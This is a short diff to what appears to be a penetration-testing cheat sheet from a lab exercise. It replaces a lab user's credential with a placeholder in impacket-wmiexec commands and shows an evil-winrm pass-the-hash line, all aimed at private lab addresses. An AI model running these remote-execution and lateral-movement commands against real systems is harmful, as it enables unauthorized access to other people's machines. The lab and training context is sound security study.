@@ -4088,8 +4088,8 @@ evil-winrm -u <user> -H <hash> -i 172.16.138.83
 ````
 ###### WMI
 ````
-proxychains -q impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
-impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
+proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
+impacket-wmiexec forest/bob:'password'@172.16.138.10
 ````
 ###### RDP
 ````
